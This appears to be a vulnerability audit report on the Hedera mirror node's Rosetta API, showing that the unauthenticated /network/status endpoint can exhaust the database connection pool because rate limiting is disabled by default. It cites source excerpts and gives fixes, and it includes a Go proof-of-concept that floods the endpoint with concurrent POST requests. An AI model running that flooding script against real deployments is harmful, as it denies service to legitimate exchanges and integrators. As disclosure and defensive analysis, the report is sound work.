I verified all code references in the claim. Here is my assessment:

**Verified facts:**

1. `NetworkStatus()` code path — confirmed in `network_service.go` lines 67–80: calls `RetrieveGenesis`, `RetrieveLatest`, and `Entries` sequentially. [1](#0-0) 

2. `initGenesisRecordFile` is cached via `sync.Once` after first call — confirmed in `block.go` lines 243–263: early-return guard `if br.genesisBlock.ConsensusStart != genesisConsensusStartUnset` means no DB hit after first initialization. [2](#0-1) 

3. `RetrieveLatest` always executes `selectLatestWithIndex` — confirmed at lines 195–200. [3](#0-2) 

4. `Entries` always executes `latestNodeServiceEndpoints` for file 101 and potentially file 102 — confirmed at lines 63–75. [4](#0-3) 

5. Middleware chain in `main.go` is `MetricsMiddleware → TracingMiddleware → CorsMiddleware → router` — no rate limiting, no concurrency cap. [5](#0-4) 

6. Traefik middleware template is gated on `global.middleware` — confirmed in `middleware.yaml` line 3: `{{ if and .Values.global.middleware .Values.middleware }}`. [6](#0-5) 

7. `global.middleware` defaults to `false` — confirmed in `values.yaml` line 95. [7](#0-6) 

8. The ingress annotation always references the middleware CRD by name, but the CRD is never created when `global.middleware: false` — confirmed at `values.yaml` lines 121–122. [8](#0-7) 

9. DB pool is configurable via `Pool.MaxOpenConnections` and applied in `db.go` line 33. [9](#0-8) 

All claims are technically accurate. The vulnerability is valid.

---

# Audit Report

## Title
Unauthenticated `/network/status` Endpoint Exhausts DB Connection Pool via Concurrent Flooding (No Rate Limiting by Default)

## Summary
The `NetworkStatus()` handler in `rosetta/app/services/network_service.go` issues 2–3 sequential database queries per request with no application-level rate limiting. The Traefik-based rate limiting middleware is disabled by default (`global.middleware: false`). Any unauthenticated external caller can flood the endpoint with concurrent requests, exhausting the finite DB connection pool and causing denial-of-service for all legitimate callers.

## Finding Description

**Exact code path:**

`NetworkStatus()` at `rosetta/app/services/network_service.go` lines 59–88 makes three calls per request:

1. `n.RetrieveGenesis(ctx)` — delegates to `blockRepository.RetrieveGenesis()` which calls `initGenesisRecordFile` guarded by a `sync.Once` check at `block.go` lines 243–263. **Cached after first call; no DB hit on subsequent requests.**

2. `n.RetrieveLatest(ctx)` — calls `initGenesisRecordFile` (cached), then always executes `selectLatestWithIndex` against the DB at `block.go` lines 195–200. **1 DB query per request, always.**

3. `n.addressBookEntryRepo.Entries(ctx)` — always executes `latestNodeServiceEndpoints` for file 101 and potentially file 102 at `address_book_entry.go` lines 63–75. **1–2 DB queries per request, always.**

**Root cause — no application-level rate limiting:**

The Go HTTP server middleware chain in `main.go` lines 217–219 is:
```
MetricsMiddleware → TracingMiddleware → CorsMiddleware → router
```
No rate limiting, no concurrency cap, no authentication at any layer.

**Existing check is insufficient — Traefik middleware is opt-in and disabled by default:**

The Helm chart defines Traefik middleware with `inFlightReq: amount: 5` per IP and `rateLimit: average: 10` per host in `values.yaml` lines 149–166, but the middleware template at `charts/hedera-mirror-rosetta/templates/middleware.yaml` line 3 is gated on `global.middleware` being `true`, which defaults to `false` at `values.yaml` line 95.

Additionally, the ingress annotation at `values.yaml` lines 121–122 always references the middleware CRD by name, but since the CRD is never created when `global.middleware: false`, Traefik either ignores the missing middleware (traffic passes through unthrottled) or rejects the route entirely — neither outcome provides rate limiting.

**DB connection pool is finite:**

The pool is configured via `Pool.MaxOpenConnections` applied in `db.go` line 33. Each concurrent `/network/status` request holds 1–2 DB connections for the duration of the query. With sufficient concurrent attackers, the pool is fully saturated.

## Impact Explanation

When the DB connection pool is exhausted, all subsequent DB-backed endpoints (block queries, account queries, construction) return `ErrDatabaseError` to legitimate callers. The Rosetta node becomes effectively unavailable for exchanges or integrators relying on it. Since the Rosetta API is used by exchanges for blockchain data integration, this constitutes a meaningful service disruption. Severity is medium/griefing: no funds are at risk, but service availability is fully compromised for the duration of the attack.

## Likelihood Explanation

The attack requires no credentials, no special knowledge, and no on-chain resources — only the ability to send HTTP POST requests to a publicly reachable port (default 5700). A single attacker with a modest number of concurrent connections can saturate the pool. The attack is trivially repeatable and sustainable indefinitely. Deployments that skip the Helm chart (bare Docker or custom Kubernetes manifests) will have no Traefik protection regardless of chart defaults.

## Recommendation

1. **Enable the Traefik middleware by default**: Change `global.middleware` default from `false` to `true` in `charts/hedera-mirror-rosetta/values.yaml` line 95, or decouple the rosetta middleware from the global flag.

2. **Add application-level rate limiting**: Insert a rate-limiting middleware into the chain in `rosetta/main.go` between `CorsMiddleware` and the router, using a library such as `golang.org/x/time/rate` or `github.com/ulule/limiter`.

3. **Add a DB connection acquisition timeout**: Configure `SetConnMaxIdleTime` and ensure `statementTimeout` is set aggressively to prevent long-held connections from blocking the pool.

4. **Fix the ingress/middleware CRD mismatch**: The ingress annotation should only reference the middleware CRD when `global.middleware: true`, or the CRD should be created unconditionally.

## Proof of Concept

```go
package main

import (
    "bytes"
    "fmt"
    "net/http"
    "sync"
)

func main() {
    const target = "http://<rosetta-host>:5700/network/status"
    const concurrency = 100

    body := []byte(`{"network_identifier":{"blockchain":"Hedera","network":"mainnet"}}`)

    var wg sync.WaitGroup
    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for {
                resp, err := http.Post(target, "application/json", bytes.NewReader(body))
                if err == nil {
                    fmt.Println("status:", resp.StatusCode)
                    resp.Body.Close()
                }
            }
        }()
    }
    wg.Wait()
}
```

With 100 concurrent goroutines each continuously POSTing to `/network/status`, each request holds 1–2 DB connections for the duration of the `selectLatestWithIndex` and `latestNodeServiceEndpoints` queries. Once the pool (`MaxOpenConnections`) is saturated, all other DB-backed endpoints begin returning `ErrDatabaseError` to legitimate callers.

### Citations

**File:** rosetta/app/services/network_service.go (L59-88)
```go
func (n *networkAPIService) NetworkStatus(
	ctx context.Context,
	_ *rTypes.NetworkRequest,
) (*rTypes.NetworkStatusResponse, *rTypes.Error) {
	if !n.IsOnline() {
		return nil, errors.ErrEndpointNotSupportedInOfflineMode
	}

	genesisBlock, err := n.RetrieveGenesis(ctx)
	if err != nil {
		return nil, err
	}

	currentBlock, err := n.RetrieveLatest(ctx)
	if err != nil {
		return nil, err
	}

	peers, err := n.addressBookEntryRepo.Entries(ctx)
	if err != nil {
		return nil, err
	}

	return &rTypes.NetworkStatusResponse{
		CurrentBlockIdentifier: currentBlock.GetRosettaBlockIdentifier(),
		CurrentBlockTimestamp:  currentBlock.GetTimestampMillis(),
		GenesisBlockIdentifier: genesisBlock.GetRosettaBlockIdentifier(),
		Peers:                  peers.ToRosetta(),
	}, nil
}
```

**File:** rosetta/app/persistence/block.go (L190-208)
```go
func (br *blockRepository) RetrieveLatest(ctx context.Context) (*types.Block, *rTypes.Error) {
	if err := br.initGenesisRecordFile(ctx); err != nil {
		return nil, err
	}

	db, cancel := br.dbClient.GetDbWithContext(ctx)
	defer cancel()

	rb := &recordBlock{}
	if err := db.Raw(selectLatestWithIndex).First(rb).Error; err != nil {
		return nil, handleDatabaseError(err, hErrors.ErrBlockNotFound)
	}

	if rb.Index < br.genesisBlock.Index {
		return nil, hErrors.ErrBlockNotFound
	}

	return rb.ToBlock(br.genesisBlock), nil
}
```

**File:** rosetta/app/persistence/block.go (L243-263)
```go
func (br *blockRepository) initGenesisRecordFile(ctx context.Context) *rTypes.Error {
	if br.genesisBlock.ConsensusStart != genesisConsensusStartUnset {
		return nil
	}

	db, cancel := br.dbClient.GetDbWithContext(ctx)
	defer cancel()

	var rb recordBlock
	if err := db.Raw(selectGenesis, sql.Named("treasury_entity_id", br.treasuryEntityId.EncodedId)).
		First(&rb).Error; err != nil {
		return handleDatabaseError(err, hErrors.ErrNodeIsStarting)
	}

	br.once.Do(func() {
		br.genesisBlock = rb
	})

	log.Infof("Fetched genesis record file, index - %d", br.genesisBlock.Index)
	return nil
}
```

**File:** rosetta/app/persistence/address_book_entry.go (L57-83)
```go
func (aber *addressBookEntryRepository) Entries(ctx context.Context) (*types.AddressBookEntries, *rTypes.Error) {
	db, cancel := aber.dbClient.GetDbWithContext(ctx)
	defer cancel()

	nodes := make([]nodeServiceEndpoint, 0)
	// address book file 101 has service endpoints for nodes, resort to file 102 if 101 doesn't exist
	for _, fileId := range []int64{aber.addressBook101.EncodedId, aber.addressBook102.EncodedId} {
		if err := db.Raw(
			latestNodeServiceEndpoints,
			sql.Named("file_id", fileId),
		).Scan(&nodes).Error; err != nil {
			log.Error("Failed to get latest node service endpoints", err)
			return nil, errors.ErrDatabaseError
		}

		if len(nodes) != 0 {
			break
		}
	}

	entries := make([]types.AddressBookEntry, 0, len(nodes))
	for _, node := range nodes {
		entries = append(entries, node.toAddressBookEntry())
	}

	return &types.AddressBookEntries{Entries: entries}, nil
}
```

**File:** rosetta/main.go (L217-219)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
```

**File:** charts/hedera-mirror-rosetta/templates/middleware.yaml (L3-3)
```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L95-95)
```yaml
  middleware: false
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L119-122)
```yaml
ingress:
  annotations:
    traefik.ingress.kubernetes.io/router.middlewares: '{{ include "hedera-mirror-rosetta.namespace" . }}-{{ include "hedera-mirror-rosetta.fullname" . }}@kubernetescrd'
  enabled: true
```

**File:** rosetta/app/db/db.go (L31-33)
```go
	sqlDb.SetMaxIdleConns(dbConfig.Pool.MaxIdleConnections)
	sqlDb.SetConnMaxLifetime(time.Duration(dbConfig.Pool.MaxLifetime) * time.Minute)
	sqlDb.SetMaxOpenConns(dbConfig.Pool.MaxOpenConnections)
```
